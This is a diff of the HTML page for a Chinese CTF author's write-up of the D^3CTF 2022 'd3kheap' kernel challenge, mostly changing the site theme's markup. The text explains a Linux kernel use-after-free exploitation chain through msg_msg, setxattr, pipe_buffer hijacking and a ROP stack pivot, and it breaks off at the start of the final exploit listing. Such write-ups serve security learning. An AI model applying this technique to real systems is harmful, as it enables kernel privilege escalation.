@@ -1,239 +1,337 @@
+
+
 <!DOCTYPE html>
-<html lang="zh-CN" color-mode="light">
-
-  <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="keywords" content="" />
-  <meta name="author" content="arttnba3" />
-  <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ" />
-  
-  
-  <title>
-    
-      【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记 
-      
-      
-      |
-    
-     arttnba3&#39;s blog
-  </title>
-
-  
-    <link rel="apple-touch-icon" href="/img/favicon.png">
-    <link rel="icon" href="/img/favicon.png">
-  
-
-  <!-- Raleway-Font -->
-  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
-
-  <!-- hexo site css -->
-  
-<link rel="stylesheet" href="/css/color-scheme.css">
-<link rel="stylesheet" href="/css/base.css">
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
-<link rel="stylesheet" href="/css/github-markdown.css">
-<link rel="stylesheet" href="/css/highlight.css">
-<link rel="stylesheet" href="/css/comments.css">
-
-  <!-- 代码块风格 -->
-  
-
-  <!-- jquery3.3.1 -->
-  
-    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
-  
-
-  <!-- fancybox -->
-  
-    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
-    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
-  
-  
-<script src="/js/fancybox.js"></script>
+<html lang="zh-CN" data-default-color-scheme=auto>
 
 
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="arttnba3">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="听说 sb 出题人把 exp 也给打包发布了，比赛结束才发现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记">
+<meta property="og:url" content="http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/index.html">
+<meta property="og:site_name" content="arttnba3&#39;s blog">
+<meta property="og:description" content="听说 sb 出题人把 exp 也给打包发布了，比赛结束才发现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/03/08/gartTlFBis2xALv.png">
+<meta property="article:published_time" content="2022-03-08T10:25:07.000Z">
+<meta property="article:modified_time" content="2022-05-16T21:46:59.000Z">
+<meta property="article:author" content="arttnba3">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="信息安全">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Use After Free">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Linux Kernel">
+<meta property="article:tag" content="Kernel UAF">
+<meta property="article:tag" content="D^3CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2022/03/08/gartTlFBis2xALv.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记 - arttnba3&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
-  <script>
-    var html = document.documentElement
-    const colorMode = localStorage.getItem('color-mode')
-    if (colorMode) {
-      document.documentElement.setAttribute('color-mode', colorMode)
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.arttnba3.cn","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
 <meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
 </head>
 
 
-  <body>
-    <div id="app">
-      <div class="header">
-  <div class="avatar">
-    <a target="_blank" rel="noopener" href="https://arttnba3.cn">
-      <!-- 头像取消懒加载，添加no-lazy -->
-      
-        <img src="/img/avatar.png" alt="">
-      
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 80vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>arttnba3&#39;s blog</strong>
     </a>
-    <div class="nickname"><a target="_blank" rel="noopener" href="https://arttnba3.cn">arttnba3's blog</a></div>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+                rss
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-  <div class="navbar">
-    <ul>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-08 18:25" pubdate>
+          2022年3月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          undefined 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          NaN 分钟
+        
+      </span>
+    
+
+    
+    
       
-        <li class="nav-item" data-path="/">
-          <a href="/">Home</a>
-        </li>
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
       
-        <li class="nav-item" data-path="/archives/">
-          <a href="/archives/">Archives</a>
-        </li>
+    
+  </div>
+
+
+        
+      </div>
+
       
-        <li class="nav-item" data-path="/categories/">
-          <a href="/categories/">Categories</a>
-        </li>
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
       
-        <li class="nav-item" data-path="/tags/">
-          <a href="/tags/">Tags</a>
-        </li>
-      
-        <li class="nav-item" data-path="/friends/">
-          <a href="/friends/">Friends</a>
-        </li>
-      
-        <li class="nav-item" data-path="/about/">
-          <a href="/about/">About</a>
-        </li>
-      
-    </ul>
+    </div>
   </div>
 </div>
 
+</div>
 
-<script src="/js/activeNav.js"></script>
+  </header>
 
+  <main>
+    
+      
 
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
 
-      <div class="flex-container">
-        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
-<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+    </div>
 
-
-  <!-- LaTex Display -->
-
-  
-    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
-  
-  <script>
-    MathJax = {
-      tex: {
-        inlineMath: [['$', '$'], ['\\(', '\\)']]
-      }
-    }
-  </script>
-
-
-
-
-
-  <!-- clipboard -->
-
-  
-    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
-  
-  
-<script src="/js/codeCopy.js"></script>
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
-  <div class="container post-details" id="post-details">
-    <div class="post-content">
-      <div class="post-title">【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记</div>
-      <div class="post-attach">
-        <span class="post-pubtime">
-          <i class="iconfont icon-updatetime" title="更新时间"></i>
-          2022-03-08 18:25:07
-        </span>
-        
-              <span class="post-categories">
-                <i class="iconfont icon-bookmark" title="分类"></i>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记</h1>
+            
+              <p class="note note-info">
                 
-                <span class="span--category">
-                  <a href="/categories/CTF/" title="CTF">
-                    <b>#</b> CTF
-                  </a>
-                </span>
+                  
+                    本文最后更新于：2022年5月17日 凌晨
+                  
                 
-              </span>
-          
-              <span class="post-tags">
-                <i class="iconfont icon-tags" title="标签"></i>
+              </p>
+            
+            
+              <div class="markdown-body">
                 
-                <span class="span--tag">
-                  <a href="/tags/Pwn/" title="Pwn">
-                    <b>#</b> Pwn
-                  </a>
-                </span>
-                
-                <span class="span--tag">
-                  <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="信息安全">
-                    <b>#</b> 信息安全
-                  </a>
-                </span>
-                
-                <span class="span--tag">
-                  <a href="/tags/CTF/" title="CTF">
-                    <b>#</b> CTF
-                  </a>
-                </span>
-                
-                <span class="span--tag">
-                  <a href="/tags/Use-After-Free/" title="Use After Free">
-                    <b>#</b> Use After Free
-                  </a>
-                </span>
-                
-                <span class="span--tag">
-                  <a href="/tags/Linux/" title="Linux">
-                    <b>#</b> Linux
-                  </a>
-                </span>
-                
-                <span class="span--tag">
-                  <a href="/tags/Linux-Kernel/" title="Linux Kernel">
-                    <b>#</b> Linux Kernel
-                  </a>
-                </span>
-                
-                <span class="span--tag">
-                  <a href="/tags/Kernel-UAF/" title="Kernel UAF">
-                    <b>#</b> Kernel UAF
-                  </a>
-                </span>
-                
-                <span class="span--tag">
-                  <a href="/tags/D-3CTF/" title="D^3CTF">
-                    <b>#</b> D^3CTF
-                  </a>
-                </span>
-                
-              </span>
-          
-      </div>
-      <div class="markdown-body">
-        <p>听说 sb 出题人把 exp 也给打包发布了，比赛结束才发现</p>
+                <p>听说 sb 出题人把 exp 也给打包发布了，比赛结束才发现</p>
 <span id="more"></span>
 
 <h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>本题的原型来自于笔者大三上学期面试国内某安全大厂时的一道面试题，当时的问题是：</p>
@@ -291,9 +389,9 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="type">long</span> m_type;</span><br><span class="line">	<span class="type">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 <p>在内核当中这两个结构体形成一个如下结构的循环双向链表：</p>
-<p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>若是消息队列中只有一个消息则是这样：</p>
-<p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>接下来我们来深入 msg_msg 的内部结构，阅读 msgsnd 源码可知，当我们在消息队列上发送一个 message 时，其首先会调用 <code>load_msg</code> 将该 message 拷贝到内核中</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">long</span> mtype, <span class="type">void</span> __user *mtext,</span></span><br><span class="line"><span class="params">		<span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="type">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	msg = load_msg(mtext, msgsz);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure>
 
@@ -305,7 +403,7 @@
 <li>对于大小在【一个页面再减掉作为 header 的 msg_msg 的 size】范围内的数据而言，内核仅会分配一个 size + header size 大小的 object（通过 kmalloc），其前 0x30 大小的部分存放 msg_msg 这一 header，剩余部分用以存放用户数据</li>
 <li>对于大小超出【一个页面再减掉作为 header 的 msg_msg 的 size】范围的数据而言，其会额外生成 <code>msg_msgseg</code> 结构体来存放用户数据，通过 kmalloc 分配，大小为剩余未拷贝的用户数据大小加上 next 指针；该结构体与 msg_msg 的 next 成员形成一个<strong>单向链表</strong>，其前 8 字节存放指向下一个 msg_msgseg 的指针，若无则为 NULL</li>
 </ul>
-<p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>我们不难想到的是，我们可以分配一个大小为 1024 的 msg_msg 结构体作为 victim，利用 setxattr 系统调用修改其 header 中的 <code>m_ts</code> 成员，<strong>从而实现堆上的越界数据读取</strong>，同时还能通过修改 msg_msg-&gt;next <strong>实现任意地址读</strong></p>
 <p>但是这样有一个问题，当我们调用 msgrcv 接受消息时，其会调用 <code>list_del()</code> 将对应的 msg_msg 结构体从双向链表中 unlink，<strong>此时我们并不知道内核空间中的任何地址，因此内核会在 unlink 时 panic 掉</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> __user *buf, <span class="type">size_t</span> bufsz, <span class="type">long</span> msgtyp, <span class="type">int</span> msgflg,</span></span><br><span class="line"><span class="params">	       <span class="type">long</span> (*msg_handler)(<span class="type">void</span> __user *, <span class="keyword">struct</span> msg_msg *, <span class="type">size_t</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    		list_del(&amp;msg-&gt;m_list);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    		<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">	free_msg(msg);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -323,10 +421,10 @@
 
 <p>我们不难想到的是，若是我们<strong>分配多个大小同为 1024 的 msg_msg 结构体，则其很容易落在地址连续的 4 张内存页上</strong>，此时若是我们从其中一个 msg_msg 结构体向后进行越界读，<strong>则很容易读取到其他的 msg_msg 结构体的数据</strong>，其 m_list 成员可以帮助我们泄露出一个堆上地址</p>
 <p>那么这个堆上地址指向哪呢？让我们将目光重新放回 <code>msg_queue</code> 与 <code>msg_msg</code> 结构体之间的关系，当一个消息上只有一个 message 时，我们不难看出 msg_msg 的 prev 与 next 指针都指向 msg_queue 的 <code>q_messages</code> 域，对应地， msg_queue-&gt;q_message 的 prev 与 next 也同样指向 msg_msg 的 <code>m_list</code> 域</p>
-<p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>此时我们不难想到，<strong>我们可以将 msg_msg 的 next 指针指回 msg_queue，从而读出上面的指向 msg_msg 的指针，将未知的地址变为已知的地址</strong>，之后我们在搜索时便可以选择从该地址开始搜索，这样我们就能知道每次搜索时获得的每一条数据的地址，<strong>从而在每次搜索时能够挑选已知数据为 NULL 的区域作为 next-&gt;next 以避免 kernel panic</strong>，以此获得连续的搜索内存的能力</p>
 <p>但是这有一个小要求，我们在泄露 msg_msg 地址时应当选取 msg_queue-&gt;q_message 往前的一块为 NULL 的区域作为 msg_msg-&gt;next，不过令笔者欣喜的是，<code>msg_queue-&gt;q_lrpid</code> 在未使用 msgrcv 接收消息时<strong>为 NULL</strong>，该成员在 q_message 成员向前的 8 字节处，因此我们可以将 next 指针指向这个位置</p>
-<p><img src="https://s2.loli.net/2022/02/25/5fOESRbu6Zan7mU.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/02/25/5fOESRbu6Zan7mU.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>泄露出 msg_msg 的地址之后就可以开始愉快的内存搜索了，至于在泄露出内核代码段上指针后如何计算出内核代码段基址，笔者这里的做法比较笨：将经常出现的内核指针做成一个字典，之后直接 query 即可，若字典未命中则继续搜索</p>
 <blockquote>
 <p>可能有的人会想到一个更为快捷的办法：因为我们已经获得了内核的“堆上地址”，所以我们可以去猜测“堆的基址”（<code>page_offset_base</code>），在 <code>page_offset_base + 0x9d000</code> 处<strong>固定存放着</strong> <code>secondary_startup_64</code> 函数的地址，而这个地址前面刚好有一片为 0 的区域方便我们的 next 指针进行指向</p>
@@ -347,34 +445,34 @@
 <p>而当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，因此我们只需要劫持其函数表即可，劫持的位置也很清晰：前面我们在搜索内存时获取到了其中一个 msg_msg 的地址，只需要减去其与被用于 UAF 的 object 的地址之间的偏移即可，这个偏移值在搜索过程中是可以计算出来的</p>
 <p>之后我们将函数表劫持到 pipe_buffer 所处 object 上，在该 object 上布置好 ROP 链，再选一条合适的用于栈迁移的 gadget 即可</p>
 <p>经笔者实测，此时的 rsi 寄存器指向 pipe_buffer，因此笔者选择了一条 <code>push rsi ; pop rsp ; pop 4 vals ; ret</code> 的 gadget 完成栈迁移</p>
-<p><img src="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>最终的 exp 如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span 